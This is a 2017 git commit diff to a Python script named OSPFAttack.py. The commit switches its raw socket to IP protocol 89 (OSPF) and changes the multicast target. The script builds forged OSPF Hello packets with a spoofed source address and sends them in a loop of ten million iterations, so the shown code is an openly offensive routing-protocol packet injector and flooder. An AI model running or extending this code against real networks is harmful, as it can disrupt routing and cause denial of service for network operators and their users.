ad0ae1711bd5f2e39bb922db5be70bbff446980d
Raphael Baldi <raphaelbaldi@gmail.com>
2017-11-18 12:04:52 -0200

    Fixed protocol information and multicast address

--- OSPFAttack.py
+++ OSPFAttack.py
@@ -19,17 +19,20 @@ def main():
     with open("config.yml", 'r') as ymlfile:
         config = yaml.load(ymlfile)
 
+    MCAST_GRP = '224.0.0.1'
+    MCAST_PORT = 10000
+
     # initialize the socket
     try:
-        sfd = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        sfd = socket.socket(socket.AF_INET, socket.SOCK_RAW, 89)
         ttl = struct.pack('b', 1)
         sfd.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, ttl)
 
-        ip = serializeIPHeader(0, 5, '192.168.1.9', '224.0.0.5')
+        ip = serializeIPHeader(0, 89, '192.168.1.9', MCAST_GRP)
         hello = createHelloPacket(3200, 0, '255.255.255.0', 10, 40)
 
         for i in range(1, 10000000, 1):
-            print sfd.sendto(ip + hello, ('224.0.0.5', 1000))
+            print sfd.sendto(hello, (MCAST_GRP, MCAST_PORT))
 
     except socket.error , msg:
         print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
